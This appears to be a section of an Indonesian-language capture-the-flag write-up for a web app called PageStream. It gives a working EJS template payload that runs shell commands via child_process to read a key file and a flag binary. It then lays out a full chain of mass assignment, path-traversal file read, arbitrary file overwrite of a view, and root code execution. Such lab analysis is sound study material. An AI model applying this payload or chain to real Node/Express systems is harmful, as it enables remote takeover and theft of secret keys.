# PageStream — Analisis

[← Overview](51-pagestream.md) · [Index](index.md)

## 2.4 RCE via overwrite EJS view

EJS dirender oleh Express:

```js
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
```

`NODE_ENV` tidak diset, sehingga view cache Express nonaktif; template dibaca ulang tiap request. Menimpa `views/dashboard.ejs` dengan payload EJS:

```ejs
<%= global.process.mainModule.require('child_process')
    .execSync('id; echo ---KEY---; cat /etc/pagestream.key; echo ---FLAG---; '
            + '/readflag $(cat /etc/pagestream.key)').toString() %>
```

lalu `GET /dashboard` mengeksekusi perintah sebagai root.

## 2.5 Rantai penuh

```text
register user
  -> POST /profile role=admin          (mass assignment)
  -> GET /view?file=../../root/flag.txt (LFI, flag langsung)
     atau
  -> POST /post/new filename=../views/dashboard.ejs (arbitrary write)
  -> GET /dashboard                    (EJS RCE root)
  -> /readflag $(cat /etc/pagestream.key)
```
